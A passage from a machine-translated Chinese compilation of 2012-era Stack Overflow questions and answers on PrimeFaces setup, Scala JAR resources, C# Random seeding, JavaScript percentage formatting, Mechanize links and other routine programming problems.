    <param-name>javax.servlet.jsp.jstl.fmt.localizationContext</param-name>
    <param-value>resources.application</param-value>
 </context-param>
  <context-param>
    <description>State saving method: 'client' or 'server' (=default). See JSF    Specification 2.5.2</description>
    <param-name>javax.faces.STATE_SAVING_METHOD</param-name>
    <param-value>client</param-value>
  </context-param>
  <context-param>
    <description></description>
<param-name>org.apache.myfaces.ALLOW_JAVASCRIPT</param-name>
<param-value>true</param-value>
  </context-param>
<context-param>
<description></description>
<param-name>org.apache.myfaces.PRETTY_HTML</param-name>
<param-value>true</param-value>
</context-param>
  <context-param>
<param-name>org.apache.myfaces.DETECT_JAVASCRIPT</param-name>
<param-value>false</param-value>
</context-param>
<context-param>
  <description></description>
    <param-name>org.apache.myfaces.AUTO_SCROLL</param-name>
<param-value>true</param-value>
</context-param>
<listener>
  <listener-class>org.apache.myfaces.webapp.StartupServletContextListener</listener-  class>
</listener>
<servlet>
  <servlet-name>Faces Servlet</servlet-name>
<servlet-class>javax.faces.webapp.FacesServlet</servlet-class>
<load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
 <servlet-name>Faces Servlet</servlet-name>
 <url-pattern>*.xhtml</url-pattern>
</servlet-mapping>
</web-app> 
```

我的 XHTML 文件如下所示。

```
<html xmlns="http://www.w3.org/1999/xhtml"
  xmlns:ui="http://java.sun.com/jsf/facelets"
  xmlns:h="http://java.sun.com/jsf/html" 
  xmlns:p="http://primefaces.org/ui">
<h:head>
  <title><ui:insert name="title">Facelets Tutorial</ui:insert></title>
</h:head>
<body>
    <p:editor />
    <p:spinner />
</body>
</html> 
```

我启动我的服务器（Tomcat 6），渲染的 HTML 看起来像这样，h: 标签渲染得很好，p: 标签仍然是 p: 标签。

```
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:p="http://primefaces.org/ui"><head>
  <title>Facelets Tutorial</title></head>
<body>
    <p:editor></p:editor>
    <p:spinner></p:spinner>
</body>
</html> 
```

我将 PrimeFaces jar 添加到我的构建路径中，并且我知道它已被识别，因为我可以在源文件中很好地导入/使用 PrimeFaces 类。我什至下载了 PF 源并将其添加到我的项目中以确保可以看到它，但我仍然遇到这个问题。我的 web.xml 中是否需要一些额外的配置？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-21T03:47:06.787

无论是否构建路径，您都需要确保 PrimeFaces JAR 文件最终`/WEB-INF/lib`位于构建和部署的 WAR 文件的文件夹中。症状表明情况并非如此。

在 Eclipse 中，只需将 PrimeFaces JAR 文件直接放到`/WEB-INF/lib`Web 项目结构的文件夹中即可。没有其他事情需要做；Eclipse 会自动将它添加到构建路径和部署程序集中。在尝试安装 PrimeFaces 之前，不要忘记撤消您在构建路径中所做的所有更改。

如果您真的坚持将 JAR 保留在其他地方并出于某种原因手动管理构建路径，那么您还需要手动将其添加到项目属性的*Deployment Assembly*部分，以使其最终`/WEB-INF/lib`位于战争。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T21:57:49.170

您应该使用“h:body”而不仅仅是“body”。

# scala - 在 Scala 中从 JAR 加载文件

> ID：10239315
> 
> 赞同：7
> 
> 时间：2012-04-20T02:08:34.303
> 
> 标签：scala, jar

我有以下代码结构：

```
Projects/
     classes/
         performance/AcPerformance.class
         resources/
                  Aircraft/
                          allAircraft.txt 
```

我在 JAR 中有 classes 文件夹的内容，并且我的 AcPerformance scala 代码正在尝试读取 Aircraft 文件夹文本文件的内容。我的代码：

```
val AircraftPerf = getClass.getResource("resources/Aircraft").getFile
val dataDir = new File(AircraftPerf)
val acFile = new File(dataDir, "allAircraft.txt")

for (line <- linesFromResource(acFile)) {
  // read in lines
} 
```

当我尝试运行代码时，出现以下错误：

原因：java.io.FileNotFoundException: C:\Projects\file:\C:\Projects\libraries\aircraft.jar!\Aircraft\allAircraft.txt（文件名、目录名或卷标语法不正确）

这是读取 JAR 内容的正确方法吗？谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T02:30:29.177

不，`URL`'s`getFile`不会在这里做你想做的事——它给你的路径不是你可以在`File`构造函数中使用的文件系统路径。您最好使用`getResourceAsStream`资源的完整路径：

```
val in = getClass.getResourceAsStream("/resources/Aircraft/allAircraft.txt") 
```

请注意，您还需要在路径前加上以使其成为绝对路径 - 在您当前的版本中，您正在`/`寻找.`resources``performance`

# asp.net - ASP.net Gridview 项目模板下拉列表

> ID：10239316
> 
> 赞同：3
> 
> 时间：2012-04-20T02:08:39.983
> 
> 标签：asp.net, gridview, itemtemplate, html.dropdownlistfor

我正在使用 C# ASP.net，并且相对较新，需要在下面完成。

在我的 VS2010 Web 应用程序项目中，我有`webform`一个`Gridview`从表中获取数据的。

在网格中，我有`Commandfiled`按钮（column1）和带有`Dropdownlist`（column2）的项目模板。

用例是，用户首先`listitem`从 3 个列表项（H、L 和 M）中选择一个，然后选择命令按钮。

我无法弄清楚如何`listitem`从选定的行中提取所选内容

```
protected void GridView2_SelectedIndexChanged(object sender, EventArgs e)
{

    GridViewRow row = GridView2.SelectedRow;
    Label4.Text = "You selected " + row.Cells[4].Text + "."; 
    Label5.Text = "You selected this list item from dropdownlist " + ???? ; 
} 
```

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:15:29.007

该`GridViewRow`对象提供方法[**`FindControl`**](http://msdn.microsoft.com/en-us/library/486wc64h.aspx)（与所有容器控件一样）以通过其 id 访问行中的控件。例如，如果您`DropDownList`的 id 为`MyDropDown`，则可以使用以下命令访问其选定值：

```
GridViewRow row = GridView2.SelectedRow;
DropDownList MyDropDown = row.FindControl("MyDropDown") as DropDownList;
string theValue = MyDropDown.SelectedValue;
// now do something with theValue 
```

这是访问`GridView`. 您希望尽可能避免做类似的事情`row.Cells[#]`，因为当您从 GridView 重新排列或添加/删除列时，它很容易中断。

# android - 如何测量和改善 iPhone/iPad 游戏中的电池使用情况（也适用于 Android）

> ID：10239322
> 
> 赞同：13
> 
> 时间：2012-04-20T02:09:27.313
> 
> 标签：android, ios, opengl-es, power-management

我的游戏耗电过多。与同类游戏相比，我不知道它使用了多少，但它使用了太多。玩家抱怨它使用了很多，其中一些人注意到它使他们的设备“运行热”。我刚刚开始对此进行调查，并想提出一些理论和实践问题来缩小搜索空间。这主要是关于我的游戏的 iOS 版本，但可能许多相同的问题会影响 Android 版本。很抱歉问了很多子问题，但它们似乎都相互关联，我认为最好将它们放在一起。

旁注：我的游戏不进行网络访问（在几个地方被称为耗电大）并且在后台不消耗大量电池；问题在于前台运行。

(1) 我知道有 API 可以读取电池电量，所以我可以做一些自动化测试。我的问题是：我需要多长时间（或者可能：消耗多少电池电量）才能让设备运行以获得可靠的读数？例如，如果它运行 10 分钟，那是否可靠？如果它耗尽了10％的电池，那可靠吗？还是运行一个小时左右更好（或者说，看看电池消耗 50% 需要多长时间）？我在这里要问的是电池表有多灵敏/可靠，所以我知道每次测试需要多长时间。

(2) 我试图了解高电池使用的可能原因是什么。下面我列出了一些可能的因素。请帮助我了解哪些是最可能的罪魁祸首：

(2a) 和很多游戏一样，我的游戏需要在每一帧上绘制全屏。它以大约 30 fps 的速度运行。我知道苹果公司说“只刷新你需要的屏幕”，但我几乎需要绘制每一帧。实际上，我可以做一些工作来仅绘制已更改的屏幕部分，但在我的情况下，这仍然是屏幕的大部分。无论如何，即使我可以将绘图本地化到屏幕的一部分，我仍然会每秒调用 30 次 OpenGL 交换缓冲区，所以我努力画得少一点真的很重要?

(2b) 当我绘制屏幕元素时，会进行一定数量的浮点数学运算（例如，在计算纹理 UV 坐标时），以及一些（较少的）双精度数学运算。与类似的整数运算相比，我不知道这些在电池方面有多昂贵。我可能会缓存很多这些值，而不必重复计算它们，如果那可能是胜利的话。

(2c) 我在渲染场景时做了一定量的纹理切换。我以前只担心这会使游戏变得太慢（它不会），但现在我也想知道减少纹理切换是否会减少电池使用。

(2d) 我不确定这对我来说是否实用，但是：我一直在阅读有关着色器和 OpenCL 的内容，我想了解是否要将一些 CPU 处理卸载到 GPU，这是否可能会节省电池（除了对于矢量类型的操作可能运行得更快）。或者它会在 GPU 上使用比 CPU 更多的电池吗？

我意识到我可以通过禁用游戏的某些部分并进行迭代电池测试运行来缩小哪些因素在起作用（因此是问题的第 (1) 部分）。只是禁用并非微不足道，并且有足够多的潜在罪魁祸首，我认为我会首先寻求一般性建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T20:18:43.850

一个真正帮助我降低电池使用量（以及设备温度！）的小技巧是在我的自定义 OpenGL 引擎中限制 FPS。

尤其是当场景是静态的（例如回合制游戏或用户点击暂停）时，会降低 FPS。如果用户超过 10 秒没有响应，或者像台式电脑上的屏幕保护程序一样，则进行节流。在现实世界中，用户在使用移动设备时经常会分心。当您的用户弄清楚他在哪个地铁站时，不要让您的应用程序耗尽电池；）

同样在 iPhone 上，有时 60FPS 是默认值，手动将其限制到 30 FPS 几乎看不到，并且可以保护您大约一半的 gpu 周期（因此需要大量电池！）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T14:32:22.997

尝试阅读这篇文章： [关于优化的 Android 文档](http://developer.android.com/guide/practices/design/performance.html)

对我有用的是减少垃圾收集的使用，
例如在为台式计算机编程时，你（或我）习惯于在循环外不需要变量时定义循环内的变量，这会导致大量使用垃圾收集（我说的不是原始变量，而是大对象。

尽量避免这样的事情。

# magento - Magento SSL 友好 getImageUrl();

> ID：10239324
> 
> 赞同：1
> 
> 时间：2012-04-20T02:09:41.107
> 
> 标签：magento

我为我的商店建立了一个包含子类别图像的大型下拉菜单。但是，当我进入网站的安全部分时，我会收到 SSL 错误，因为菜单中的图像是通过 http 而不是 https 加载的

我的模板文件中的图像标签如下所示

```
<img src="<?php echo $subCategory->getImageUrl(); ?>" /> 
```

有没有办法让图像在网站的安全部分中返回 https url？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:02:12.360

尝试在后端禁用 blocks_html 缓存，看看是否有区别。

如果是这样，有几种选择：

1.  关闭 blocks_html 缓存（yuk！）
2.  将安全/非安全添加到导航块缓存密钥（有趣，但有些工作）
3.  使用相对协议回显路径，例如`src="//site.com/media/catalog/category/subcat.jpg"`

HTH 本

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-28T09:51:01.090

str_replace(array("http://","//") 这将解决您的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T14:02:37.653

但是这种方式总是通过 https 获取图像——这也不是一个真正的解决方案。例如，我的整个页面加载时间是通过 https 获取一张图像所需时间的一半。

# c# - 从 ID 的 C# 列表中删除 mysql 服务器中的行

> ID：10239328
> 
> 赞同：2
> 
> 时间：2012-04-20T02:09:54.423
> 
> 标签：c#, mysql, ado.net

我正在尝试从 C# 中的 ID 列表中删除 MySQL 表中的一系列行。表中有一个employeeID 行。基本上我的问题是我会使用什么样的语法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T02:12:06.637

您可能会`IN`在您的`DELETE`:

```
DELETE FROM `EmployeeTable` WHERE EmployeeID IN (2, 3, 4, 5, ...) 
```

这可以通过`String.Join`生成列表的方法来实现：

```
var query = "DELETE FROM `EmployeeTable` WHERE EmployeeID IN (" +
    String.Join(",", myArray) + ")"; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-20T02:15:22.213

如果你使用 Dapper，它看起来像这样：

```
int[] ids = new int[]{1,2,3};
DbConnection cn = ... //open connection here
cn.Execute("delete from Employee where employeeID in @ids", new {ids}); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-20T02:12:59.293

从employeeId所在的员工中删除（2,4,3,2,34）

# iphone - iphone怎么知道这张图片是jpg还是png

> ID：10239330
> 
> 赞同：5
> 
> 时间：2012-04-20T02:10:00.043
> 
> 标签：iphone, ios, xcode, uiimagejpegrepresentation, uiimagepngrepresentation

我想从 UIImagepicker 中挑选图像，相机胶卷中有 PNG 和 JPG 格式。

我需要将其转换为 NSData。但是我需要知道这些图像是否是`UIImageJPEGRepresentation`或者`UIImagePNGRepresentation`我可以转换它。

```
UIImage *orginalImage = [info objectForKey:UIImagePickerControllerOriginalImage];    
    [picker dismissViewControllerAnimated:YES completion:nil];
    NSData *orgData = UIImagePNGRepresentation(orginalImage); 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T02:21:57.333

您不应该知道或关心相机胶卷中图像的内部表示是什么。您提到的方法`UIImageJPEGRepresentation`并`UIImagePNGRepresentation`返回相机胶卷图像的*表示*。您可以选择要使用的表示形式。

总结一下：

```
NSData * pngData = UIImagePNGRepresentation(originalImage); 
```

将返回对象中的图像表示，`NSData`格式为 PNG。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-06-11T17:33:39.450

当调用 UIImagePickerController 的委托方法 imagePickerController:didFinishPickingMediaWithInfo: 时，您将获得所选照片的​​资产 URL。

```
[info valueForKey:UIImagePickerControllerReferenceURL] 
```

现在，此 URL 可用于访问 ALAssetsLibrary 中的资产。然后，您将需要该访问资产的 ALAssetRepresentation。从这个 ALAssetRepresentation 我们可以得到该图像的 UTI ( [http://developer.apple.com/library/ios/#DOCUMENTATION/FileManagement/Conceptual/understanding_utis/understand_utis_conc/understand_utis_conc.html](http://developer.apple.com/library/ios/#DOCUMENTATION/FileManagement/Conceptual/understanding_utis/understand_utis_conc/understand_utis_conc.html) )

也许代码会使它更清晰一些：

```
- (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info {
  if (!(picker.sourceType == UIImagePickerControllerSourceTypeCamera)) {
    NSLog(@"User picked image from photo library");
    ALAssetsLibrary *library = [[[ALAssetsLibrary alloc] init] autorelease];
    [library assetForURL:[info valueForKey:UIImagePickerControllerReferenceURL] resultBlock:^(ALAsset *asset) {
      ALAssetRepresentation *repr = [asset defaultRepresentation];
      if ([[repr UTI] isEqualToString:@"public.png"]) {
        NSLog(@"This image is a PNG image in Photo Library");
      } else if ([[repr UTI] isEqualToString:@"public.jpeg"]) {
        NSLog(@"This image is a JPEG image in Photo Library");
      }
    } failureBlock:^(NSError *error) {
      NSLog(@"Error getting asset! %@", error);
    }];
  }
} 
```

正如 UTI 解释的那样，这应该是图像如何存储在照片库中的可靠答案。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-06-01T14:17:42.177

在斯威夫特 2.2

```
func imagePickerController(picker: UIImagePickerController, didFinishPickingMediaWithInfo info: [String : AnyObject]) {
    if (!(picker.sourceType == UIImagePickerControllerSourceType.Camera)) {
        let assetPath = info[UIImagePickerControllerReferenceURL] as! NSURL
        if assetPath.absoluteString.hasSuffix("JPG") {

        } else {

        } 
```

# ruby-on-rails - Solr / Sunspot 是否在搜索查询中包含新记录，即使它没有被索引？

> ID：10239332
> 
> 赞同：1
> 
> 时间：2012-04-20T02:10:05.533
> 
> 标签：ruby-on-rails, solr, sunspot

由于索引速度慢且资源密集，我只将 Solr 设置为在 12 小时内重新索引。因此，在索引之前添加新记录时，无法搜索它，对吗？

如果是，我应该换成其他搜索系统吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T17:38:06.977

文档仅在提交后可用于搜索。一旦提交给 Solr，它们就会被解析并转换为内部格式。那就是索引。

对于纯 Solr 系统，您的问题不太有意义。你有一个 RDBMS 并且你正在重新索引它吗？如果是这样，那么您是对的，Solr 仅在从数据库中获取记录、建立索引并提交时才会更新。

对于更短的延迟，有几个选项。如果您对每条记录都有一个时间戳，则可以定期仅重新索引更改的记录。他们将替换旧版本的记录。如果这样做，则需要专门处理已删除的记录，通常通过添加“已删除”列并为这些记录发出 Solr 删除命令。

数据输入处理程序支持增量查询，尽管它有点复杂。您还可以编写一些代码来读取数据库并以专用的 Solr XML 格式提交定期的 Solr 更新。

频繁更新可能会损害搜索性能。Solr 从缓存结果中获得了很多性能。这些缓存在提交后被清除。检查查询结果缓存中缓存命中率的统计页面。如果该值很高，则频繁更新可能会导致性能问题。

# c# - “new Random(x)”总是生成相同的数字？

> ID：10239346
> 
> 赞同：3
> 
> 时间：2012-04-20T02:13:05.437
> 
> 标签：c#, random

我试图获得一个唯一的随机数，但每次运行代码时我总是得到相同的数字。我会先得到 14，然后是 6，但我保存所有已使用数字的列表似乎不起作用。手动添加 14 可以，但是当我添加 randInt 时它不起作用。

```
const int numCards = 32;
        List<int> usedCards = new List<int>();
        int randInt = 0;
        Random rand = new Random(numCards);
        usedCards.Add(14);
        do
        {

            randInt = rand.Next(0, numCards);
            MessageBox.Show(randInt.ToString(), "End Game", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);

        }
        while (usedCards.Contains(randInt));

        usedCards.Add(randInt); 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-20T02:14:56.957

代替：

```
Random rand = new Random(numCards); 
```

和

```
Random rand = new Random(); 
```

[在构造函数](http://msdn.microsoft.com/en-us/library/ctssatww.aspx)调用中提供一个*固定*的种子值（`numCards`始终具有相同的值）将产生一个*可预测*的、可*重现*的序列，对于相同的种子值，该序列始终相同，就像这样（不完全是，但该点仍然有效）：[`Random`](http://msdn.microsoft.com/en-us/library/ctssatww.aspx)

 **![在此处输入图像描述](../Images/e14fe073e2c56de00ad54d935691a312.png)

例如`1`，在我的机器上使用一个固定的种子并绘制 10 个从 0 到 100 的数字，*总是*产生序列

```
24,11,46,77,65,43,35,94,10,64 
```

另一方面，不使用种子值，序列变得不可预测。

如果没有传入种子值，`Random` 将根据当前时间生成一个新的种子值，这就是您想要获得一个新的随机数序列的内容 - 前提是您不以快速顺序再次初始化它，这就是为什么您应该重新 -使用`Random`实例而不是每次都重新创建它们。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T02:23:07.480

[随机类](http://msdn.microsoft.com/en-us/library/system.random.aspx)

如果你给 Random 类的构造函数指定一个种子值，它每次都会生成相同的序列。产生随机数序列的算法是确定性的。

如果使用不带参数的构造函数，则 Random 对象将使用当前时间的种子值，因此使用此构造函数实例化的每个 Random 对象将具有不同的随机数序列，只要时间种子值不同，这很可能。

如果它们的初始化时间非常接近，您仍然可以从两个不同的 Random 对象中获得相同的数字序列。

[随机构造函数](http://msdn.microsoft.com/en-us/library/h343ddh9.aspx)**

# jquery-mobile - 当 hashListeningEnabled=false 时 jqm 1.1.0 关闭对话框

> ID：10239360
> 
> 赞同：0
> 
> 时间：2012-04-20T02:15:07.143
> 
> 标签：jquery-mobile

我有一个在href 上显示对话框的页面。我设置**hashListeningEnabled=false**因为如果有人刷新页面，他们需要再次与第一个“页面”打招呼。单击对话框时，它会正常显示，但单击关闭按钮什么也不做 - 它更改了 href（通过**history.back()**），但是由于禁用了监听，它实际上并没有关闭对话框。

有人想到解决方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T02:17:36.833

那是对的-只要我在SO上发布问题，我就会自己解决。您只需在显示对话框时打开**hashListeningEnabled**，然后您可以将其关闭。

# blackberry - 黑莓表对齐

> ID：10239363
> 
> 赞同：1
> 
> 时间：2012-04-20T02:15:23.197
> 
> 标签：blackberry, tabular

好吧，我为 Android 做了一个应用程序（可以在照片中看到）。我想为黑莓做同样的事情，但我遇到了一些麻烦。

我想要一个像这样的标题`GRA ENTIDAD Inc Sintomas`等..

然后我用信息动态填充所有行。

这是我尝试制作行的方式：

```
clsHorFieldManager firstManager = new clsHorFieldManager(
                        Field.FOCUSABLE | Manager.VERTICAL_SCROLL, Color.WHITE);

                firstManager.add(new NullField(Field.FOCUSABLE));
                add(new SeparatorField());
                firstManager.add(new LabelField(vecCampos[2]));
                firstManager.add(new LabelField(vecCampos[3]));
                firstManager.add(new LabelField(vecCampos[4]));
                firstManager.add(new LabelField(vecCampos[5]));
                firstManager.add(new LabelField(vecCampos[6]));

                add(firstManager); 
```

但我只是将所有字段放在一起。我的问题是，我怎样才能使行的每个单元格都与标题对齐？和图片一样。。

![我想要的是](../Images/4a01dde9ea9e02047c136ec554d213e7.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T14:07:08.567

参考这个 -

```
clsHorFieldManager firstManager = new clsHorFieldManager(
                    Field.FOCUSABLE | Manager.VERTICAL_SCROLL, Color.WHITE);

            firstManager.add(new NullField(Field.FOCUSABLE));
            add(new SeparatorField());
            firstManager.add(new LabelField(vecCampos[2]));
            firstManager.add(new LabelField("  ");
            firstManager.add(new LabelField(vecCampos[3]));
            firstManager.add(new LabelField("  ");
            firstManager.add(new LabelField(vecCampos[4]));
            firstManager.add(new LabelField("  ");
            firstManager.add(new LabelField(vecCampos[5]));
            firstManager.add(new LabelField("  ");
            firstManager.add(new LabelField(vecCampos[6]));

            add(firstManager); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T05:29:42.213

如果要对齐已创建的字段，最好的方法是创建自定义字段并覆盖绘制和布局方法

在构造函数中使用 setmargin 和 setpadding 方法。即使它很复杂，但如果您已经完成了 1 次实现，您可以在项目中使用多种方式。

# oracle - Oracle 客户端无法连接到远程服务器

> ID：10239367
> 
> 赞同：0
> 
> 时间：2012-04-20T02:15:57.820
> 
> 标签：oracle

在 win7 64 位上，PL/SQL Developer 客户端登录消息：“初始化错误，SQL*Net 未正确安装，OracleHomeKey: ;OracleHomeDir:”。

服务器是远程服务器，我只有一个sql客户端，因为我可以通过java代码访问数据库，所以以为tnslistener已经在那个服务器上启动了，对吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T19:07:32.940

监听器在服务器上，如果可以通过java连接到服务器，则监听器正在运行。所以不是听众问题。该错误表明您的客户端未正确安装。PL/SQL 开发者软件它试图通过oracle 客户端使用sqlnet 来访问oracle 数据库。sqlnet 驱动程序报告您的安装未配置或未正确安装。你的win7机器上安装了什么oracle客户端？您是否从 oracle 10g/11 安装了即时客户端？您是否为 oracle 10g/11 安装了完整的客户端？卸载不良安装客户端，重新安装并配置/运行客户端软件以测试 sqlnet。

# c++ - 堆分配的对象可以在堆栈上移动吗？

> ID：10239368
> 
> 赞同：7
> 
> 时间：2012-04-20T02:16:28.063
> 
> 标签：c++, memory-management, c++11, boost-asio, move-semantics

# 问题

我们可以使用移动语义来移动堆栈上的堆分配对象吗？

## 例子

```
#include <boost/asio.hpp>
#include <memory>

class connection
{
public:
    connection(boost::asio::ip::tcp::socket&& socket);

    void start();

private:
    boost::asio::ip::tcp::socket m_socket;
};

class server
{
public:
    // Not relevent here

private:
    void accept();

    boost::asio::io_service        m_io_service;
    boost::asio::ip::tcp::acceptor m_acceptor;
};

void server::accept()
{
    auto socket = new boost::asio::ip::tcp::socket(m_io_service);

    m_acceptor.async_accept(*m_socket,
    [&, socket](const boost::system::error_code& error)
    {
        if (!error)
        {
            auto connection = std::make_shared<connection>(std::move(*socket));
            connection->start();
        }

        accept();
    });
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-20T02:33:42.817

`std::move`不重定位对象。它移动值。（想想`MOV R1, R2`某种机器语言中的一条指令：它不移动寄存器，只移动内容！或者`memmove`库函数。这是“移动”的感觉，而不是复制或压缩垃圾收集器时发生的那种移动，这会导致对象驻留在不同的地址，同时保留其确切身份，这涉及在机器中的任何地方找到对移动对象的每个引用并更新它）。

移动语义是 C++ 中的一项新功能，它允许以不必保留旧值的方式复制对象。这在不再需要旧对象的情况下很有用，因为它可以更快。

例如，将一个向量从一个向量移动`std::vector<X>`到另一个向量会导致源对象是一个长度为零的向量，并且所有数据都可以在没有任何内存分配或复制的情况下移动。由于想法是不使用旧向量，因此它已被破坏为零长度并不重要。

鉴于此类操作数之间的复制构造在 C++ 中一直运行良好，因此没有理由在不同存储（例如，自由存储（“堆”）到自动存储（“堆栈”）中的位置之间不起作用。

[编辑 2020]

但是，如果我们将一个对象从堆中移动到其他地方，就会出现问题。堆中的旧内存只是被丢弃，没有任何破坏。那个记忆不再是一个对象；要再次使用它，我们必须在其中移动或构造一个对象。否则，我们应该删除它（以低级方式，不调用析构函数）。

# javascript - 我可以在没有数学的情况下在javascript中移动小数吗？

> ID：10239378
> 
> 赞同：3
> 
> 时间：2012-04-20T02:17:49.073
> 
> 标签：javascript, decimal

我希望能够在不使用数学的情况下在未知数量的数字中移动小数点 2 位。我知道这看起来很奇怪，但有限的精度会导致一些变化。我的 javascript 不强，但我真的很想学习如何切分一个数字，并在可能的情况下这样做。所以，我希望你们这些了不起的人可以提供帮助。

**问题：**

*   575/960 = 0.5989583333333334 使用控制台
*   我想制作一个副本和可粘贴的百分比，例如：59.89583333333334%
*   如果我使用数学并乘以 100，由于精度有限，它返回 59.895833333333336

有没有办法让它成为一个字符串，并且总是将小数点向右移动 2 位以跳过数学？

这也是一个小提琴，代码：http: [//jsfiddle.net/dandenney/W9fXz/](http://jsfiddle.net/dandenney/W9fXz/)

如果您想知道我为什么需要它并想要精度，这是我制作的这个小工具，用于在不使用计算器的情况下获得响应百分比：[http ://responsv.com/flexible-math](http://responsv.com/flexible-math)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T02:24:08.697

如果原始数字是这种类型的已知结构并且总是在小数点右侧至少有两位数，您可以这样做：

```
function makePercentStr(num) {
    var numStr = num + "";
    // if no decimal point, add .00 on end
    if (numStr.indexOf(".") == -1) {
        numStr += ".00";
    } else {
        // make sure there's at least two chars after decimal point
        while (!numStr.match(/\.../)) {
            numStr += "0";        
        }
    }
    return(numStr.replace(/\.(..)/, "$1.")
           .replace(/^0+/, "")    // trim leading zeroes
           .replace(/\.$/, "")    // trim trailing decimals
           .replace(/^$/, "0")    // if empty, add back a single 0
           + "%");
} 
```

使用测试用例进行演示：http: [//jsfiddle.net/jfriend00/ZRNuw/](http://jsfiddle.net/jfriend00/ZRNuw/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T02:54:53.443

该问题要求在没有数学的情况下解决问题，但以下解决方案涉及数学。我把它留作参考

```
function convertToPercentage(num) {
    //Changes the answer to string for checking
    //the number of decimal places.
    var numString = num + '';
    var length = (numString).substring(numString.indexOf(".")+1).length;

    //if the original decimal places is less then
    //no need to display decimals as we are multiplying by 100
    //else remove two decimals from the result
    var precision = (length < 2 ? 0 : length-2);

    //if the number never contained a decimal. 
    //Don't display decimal.
    if(numString.indexOf(".") === -1) {
         precision = 0;   
    }        
    return (num * 100).toFixed(precision) + "%";
} 
```

[在这里使用与接受的答案](https://stackoverflow.com/a/10239409/30594)相同的测试用例[工作 jsFiddle](http://jsfiddle.net/skCkE/4/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-13T09:43:13.460

由于存在浮动错误的风险，我使用了这种方法：

```
const DECIMAL_SEP = '.';

function toPercent(num) {
  const [integer, decimal] = String(num).split(DECIMAL_SEP);

  // no decimal, just multiply by 100
  if(typeof decimal === 'undefined') {
    return num * 100;
  }

  const length = decimal.length;

  if(length === 1) {
    return Number(integer + decimal + '0');
  }

  if(length === 2) {
    return Number(integer + decimal);
  }

  // more than 2 decimals, we shift the decimal separator by 2
  return Number(integer + decimal.substr(0, 2) + DECIMAL_SEP + decimal.substr(2));
}

console.log(toPercent(10));
console.log(toPercent(1));
console.log(toPercent(0));
console.log(toPercent(0.01));
console.log(toPercent(0.1));
console.log(toPercent(0.12));
console.log(toPercent(0.123));
console.log(toPercent(12.3456));
```

# ruby - 在 Mechanize 中单击带有 JavaScript 的链接

> ID：10239379
> 
> 赞同：5
> 
> 时间：2012-04-20T02:18:02.433
> 
> 标签：ruby, nokogiri, mechanize-ruby

我有这个：

```
<a class="top_level_active" href="javascript:Submit('menu_home')">Account Summary</a> 
```

# 

我想单击该链接，但在使用 link_to 时出现错误。

我试过了：

```
bot.click(page.link_with(:href => /menu_home/))
bot.click(page.link_with(:class => 'top_level_active'))
bot.click(page.link_with(:href => /Account Summary/)) 
```

我得到的错误是： NoMethodError: undefined method `[]' for nil:NilClass

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-20T11:17:32.827

那是一个javascript链接。Mechanize 将无法单击它，因为它不评估 javascript。对不起！

尝试找出单击该链接时浏览器中发生的情况。它会创建 POST 或 GET 请求吗？发送到服务器的参数是什么。一旦您知道这一点，您就可以在您的 Mechanize 脚本中模拟相同的操作。Chrome 开发工具/Firebug 将提供帮助。

如果这不起作用，请尝试切换到支持 javascript 评估的库。我使用[watir-webdriver](http://watirwebdriver.com/)取得了巨大成功，但您也可以尝试[phantomjs](http://code.google.com/p/phantomjs/)、[casperjs](http://casperjs.org/)、[pjscrape](http://nrabinowitz.github.io/pjscrape/)或其他工具

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:07:28.317

前 2 个应该有效，所以试试这个，打印出 href 以确保它确实存在：

```
puts page.links.map(&:href) 
```

请记住，仅仅因为您可以在浏览器中看到它并不意味着它会出现在响应中。它可以作为 ajax 更新发送。你也可以这样做，我认为它更干净：

```
page.link_with(:href => /menu_home/).click 
```

但是我不认为点击该链接会做你想要的，因为它是 javascript。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-02T22:40:49.160

这是一种处理方法。假设您的页面返回此内容：

```
puts page.body
<HTML><SCRIPT LANGUAGE="JavaScript"><!--
     top.location="http://www.example.com/pages/myaccount/dashboard.aspx?";
// --></SCRIPT>
<NOSCRIPT>Javascript required.</NOSCRIPT></HTML> 
```

我们知道它即将到来，所以我们知道要检查什么：

```
link_search = %r{top.location="([^"]+)"}
js_link = page.body.match(link_search)[1]
page = agent.get(js_link) 
```

# php - 500 内部服务器错误 .htaccess codeigniter

> ID：10239381
> 
> 赞同：1
> 
> 时间：2012-04-20T02:18:12.630
> 
> 标签：php, .htaccess, codeigniter, rewrite

我有一个使用 codeigniter 的网站，它工作得很好，但我需要格式化 pc。我安装了 Windows 7 64 位。

接着

